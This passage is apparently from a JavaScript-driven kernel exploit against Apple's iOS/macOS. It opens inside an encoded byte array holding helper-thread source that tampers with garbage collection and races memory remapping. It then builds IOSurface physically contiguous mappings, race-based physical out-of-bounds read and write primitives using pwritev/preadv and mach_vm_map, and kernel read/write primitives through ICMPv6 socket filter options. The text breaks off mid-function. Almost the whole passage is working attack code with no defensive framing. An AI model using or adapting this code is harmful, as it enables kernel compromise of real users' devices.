41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 101, 110, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 47, 42, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 80, 114, 111, 98, 108, 101, 109, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 71, 67, 32, 105, 115, 32, 116, 114, 105, 103, 103, 101, 114, 105, 110, 103, 44, 32, 97, 110, 100, 32, 105, 116, 32, 99, 97, 108, 108, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 45, 62, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 46, 103, 101, 116, 82, 101, 103, 105, 115, 116, 101, 114, 115, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 105, 115, 32, 98, 97, 110, 110, 101, 100, 32, 98, 121, 32, 97, 117, 116, 111, 98, 111, 120, 32, 105, 110, 32, 62, 61, 49, 56, 46, 52, 32, 119, 104, 105, 99, 104, 32, 108, 101, 97, 100, 115, 32, 116, 111, 32, 99, 114, 97, 115, 104, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 83, 111, 108, 117, 116, 105, 111, 110, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 111, 32, 119, 111, 114, 107, 32, 99, 111, 114, 114, 101, 99, 116, 108, 121, 32, 105, 110, 32, 110, 111, 106, 105, 116, 32, 101, 110, 118, 105, 114, 111, 110, 109, 101, 110, 116, 32, 71, 67, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 115, 99, 97, 110, 32, 97, 116, 32, 108, 101, 97, 115, 116, 32, 116, 104, 101, 32, 115, 116, 97, 99, 107, 32, 111, 102, 32, 99, 117, 114, 114, 101, 110, 116, 32, 116, 104, 114, 101, 97, 100, 32, 119, 105, 116, 104, 32, 99, 97, 108, 108, 32, 116, 111, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 116, 32, 100, 111, 101, 115, 110, 39, 116, 32, 105, 110, 118, 111, 108, 118, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 115, 111, 32, 105, 116, 39, 115, 32, 115, 97, 102, 101, 32, 116, 111, 32, 100, 111, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 118, 111, 105, 100, 32, 77, 97, 99, 104, 105, 110, 101, 84, 104, 114, 101, 97, 100, 115, 58, 58, 103, 97, 116, 104, 101, 114, 67, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 40, 46, 46, 46, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 40, 99, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 44, 32, 106, 105, 116, 83, 116, 117, 98, 82, 111, 117, 116, 105, 110, 101, 115, 44, 32, 99, 111, 100, 101, 66, 108, 111, 99, 107, 115, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 46, 46, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 33, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 40, 108, 111, 99, 107, 101, 114, 44, 32, 98, 117, 102, 102, 101, 114, 44, 32, 99, 97, 112, 97, 99, 105, 116, 121, 44, 32, 38, 115, 105, 122, 101, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 41, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 114, 111, 119, 66, 117, 102, 102, 101, 114, 40, 115, 105, 122, 101, 44, 32, 38, 98, 117, 102, 102, 101, 114, 44, 32, 38, 99, 97, 112, 97, 99, 105, 116, 121, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 79, 110, 32, 116, 104, 101, 32, 111, 116, 104, 101, 114, 32, 104, 97, 110, 100, 44, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 119, 105, 108, 108, 32, 116, 114, 121, 32, 116, 111, 32, 105, 116, 101, 114, 97, 116, 101, 32, 116, 104, 114, 101, 97, 100, 115, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 97, 110, 100, 32, 99, 97, 108, 108, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 87, 101, 32, 99, 97, 110, 32, 97, 118, 111, 105, 100, 32, 105, 116, 32, 98, 121, 32, 110, 117, 108, 108, 105, 110, 103, 32, 102, 105, 114, 115, 116, 32, 109, 101, 109, 98, 101, 114, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 46, 116, 104, 114, 101, 97, 100, 115, 32, 119, 104, 105, 99, 104, 32, 112, 114, 101, 118, 101, 110, 116, 115, 32, 105, 116, 101, 114, 97, 116, 105, 111, 110, 32, 97, 110, 100, 32, 115, 116, 105, 108, 108, 32, 109, 97, 107, 101, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 114, 101, 116, 117, 114, 110, 32, 116, 114, 117, 101, 46, 10, 32, 32, 32, 32, 10, 32, 32, 32, 32, 42, 47, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 104, 101, 97, 112, 32, 43, 32, 48, 120, 49, 57, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 116, 104, 114, 101, 97, 100, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 116, 104, 114, 101, 97, 100, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 48, 120, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 114, 109, 101, 100, 34, 41, 59, 10, 125, 10, 10, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 59, 10, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 72, 101, 108, 108, 111, 32, 102, 114, 111, 109, 58, 32, 34, 32, 43, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 46, 104, 101, 120, 40, 41, 41, 59, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 58, 32, 34, 32, 43, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 46, 104, 101, 120, 40, 41, 41, 59, 10, 10, 108, 101, 116, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 61, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 56, 110, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 48, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 56, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 48, 110, 59, 10, 108, 101, 116, 32, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 108, 101, 116, 32, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 51, 48, 110, 59, 10, 10, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 32, 123, 10, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 117, 114, 101, 97, 100, 54, 52, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 65, 108, 108, 111, 99, 97, 116, 101, 32, 97, 32, 110, 101, 119, 32, 110, 111, 110, 45, 99, 111, 110, 116, 105, 103, 117, 111, 117, 115, 32, 109, 97, 112, 32, 101, 110, 116, 114, 121, 32, 40, 111, 112, 116, 105, 111, 110, 97, 108, 108, 121, 32, 117, 115, 105, 110, 103, 32, 97, 32, 109, 101, 109, 111, 114, 121, 32, 111, 98, 106, 101, 99, 116, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 107, 114, 32, 61, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 101, 116, 95, 98, 105, 103, 105, 110, 116, 95, 97, 100, 100, 114, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 124, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 107, 114, 32, 33, 61, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 45, 93, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 32, 102, 97, 105, 108, 101, 100, 32, 33, 33, 33, 34, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 58, 32, 34, 32, 43, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 58, 32, 34, 32, 43, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 101, 120, 105, 116, 40, 48, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 125, 10, 10, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 59, 0]);
    let free_thread_js = 0n;
    if (free_thread_js == 0n) {
      free_thread_js = free_thread_js_data;
    }
    free_thread_jsthread = js_thread_spawn(free_thread_js, free_thread_arg);
  }
  let default_file_content = calloc(1n, target_file_size);
  memset_pattern8(default_file_content, get_bigint_addr(random_marker), target_file_size);
  function create_target_file(path) {
    let fd = fopen(path, get_cstring("w"));
    let written = fwrite(default_file_content, 1n, target_file_size, fd);
    fclose(fd);
  }
  function create_physically_contiguous_mapping(port, address, size) {
    let dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let cf_number = CFNumberCreate(kCFAllocatorDefault, 9n, get_bigint_addr(size));
    res = CFDictionarySetValue(dict, kIOSurfaceAllocSize, cf_number);
    let cfstring = create_cfstring(get_cstring("PurpleGfxMem"));
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceMemoryRegion")), cfstring);
    let surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == 0n) {
      LOG("[-] Failed to create surface!!!");
      exit(0n);
    }
    let physical_mapping_address = IOSurfaceGetBaseAddress(surface);
    LOG("[+] physical_mapping_address: " + physical_mapping_address.hex());
    let memory_object = new_bigint();
    let kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(size), physical_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_make_memory_entry_64 failed!!!");
      exit(0n);
    }
    let new_mapping_address = new_bigint();
    kr = mach_vm_map(mach_task_self(), get_bigint_addr(new_mapping_address), size, 0n, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memory_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_vm_map failed!!!");
      exit(0n);
    }
    CFRelease(surface);
    uwrite64(port, memory_object);
    uwrite64(address, new_mapping_address);
  }
  function initialize_physical_read_write(contiguous_mapping_size) {
    pc_size = contiguous_mapping_size;
    create_physically_contiguous_mapping(get_bigint_addr(pc_object), get_bigint_addr(pc_address), pc_size);
    LOG("[+] pc_object: " + pc_object.hex());
    LOG("[+] pc_address: " + pc_address.hex());
    memset_pattern8(pc_address, get_bigint_addr(random_marker), pc_size);
    free_target = pc_address;
    free_target_size = pc_size;
    uwrite64(free_target_sync_ptr, free_target);
    uwrite64(free_target_size_sync_ptr, free_target_size);
    uwrite64(free_thread_start_ptr, 1n);
    uwrite64(go_sync_ptr, 1n);
  }
  let iov = calloc(1n, 0x10n);
  let highiest_success_idx = 0n;
  let success_read_count = 0n;
  function physical_oob_read_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    uwrite64(buffer, random_marker);
    uwrite64(pc_address + 0x3f00n + offset, random_marker);
    let read_race_succeeded = false;
    let w = 0n;
    for (let try_idx = 0n; try_idx < highiest_success_idx + 100n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      w = pwritev(read_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
      if (w == 0xFFFFFFFFFFFFFFFFn) {
        let r = pread(read_fd, buffer, size, 0x3f00n + offset);
        let marker = uread64(buffer);
        if (marker != random_marker) {
          read_race_succeeded = true;
          success_read_count += 0x1n;
          if (try_idx > highiest_success_idx) {
            highiest_success_idx = try_idx;
          }
          break;
        } else {
          usleep(1n);
        }
      }
      if (try_idx == 500n) {
        break;
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    if (read_race_succeeded == false) {
      return 1n;
    }
    return KERN_SUCCESS;
  }
  function physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) {
    while (true) {
      kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
      if (kr == KERN_SUCCESS) {
        break;
      }
    }
  }
  function physical_oob_write_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    pwrite(write_fd, buffer, size, 0x3f00n + offset);
    for (let try_idx = 0n; try_idx < 20n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      preadv(write_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    return;
  }
  let control_socket = 0n;
  let rw_socket = 0n;
  let control_socket_pcb = 0n;
  let rw_socket_pcb = 0n;
  let EARLY_KRW_LENGTH = 0x20n;
  let control_data = calloc(1n, EARLY_KRW_LENGTH);
  function set_target_kaddr(where) {
    memset(control_data, 0n, EARLY_KRW_LENGTH);
    uwrite64(control_data, where);
    let res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, control_data, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread(where, read_buf, size) {
    if (size > EARLY_KRW_LENGTH) {
      LOG("[!] error: (size > EARLY_KRW_LENGTH)");
      exit(0n);
    }
    set_target_kaddr(where);
    let read_data_length = BigInt(size);
    res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, get_bigint_addr(read_data_length));
    if (res != 0n) {
      LOG("[-] getsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread64(where) {
    let value = new_bigint();
    let res = early_kread(where, get_bigint_addr(value), 0x8n);
    return update_bigint(value);
  }
  function early_kwrite32bytes(where, write_buf) {
    set_target_kaddr(where);
    let res = setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  let early_kwrite64_write_buf = calloc(1n, EARLY_KRW_LENGTH);
  function early_kwrite64(where, what) {
    early_kread(where, early_kwrite64_write_buf, EARLY_KRW_LENGTH);
    uwrite64(early_kwrite64_write_buf, what);
    early_kwrite32bytes(where, early_kwrite64_write_buf);
  }
  function kread_length(address, buffer, size) {
    let remaining = BigInt(size);
    let read_offset = 0n;
    let read_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        read_size = EARLY_KRW_LENGTH;
      } else {
        read_size = remaining % EARLY_KRW_LENGTH;
      }
      early_kread(address + read_offset, buffer + read_offset, read_size);
      remaining -= read_size;
      read_offset += read_size;
    }
  }
  let kwrite_length_buffer = calloc(1n, EARLY_KRW_LENGTH);
  function kwrite_length(dst, src, size) {
    let remaining = BigInt(size);
    let write_offset = 0n;
    let write_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        write_size = EARLY_KRW_LENGTH;
      } else {
        write_size = remaining % EARLY_KRW_LENGTH;
      }
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != EARLY_KRW_LENGTH) {
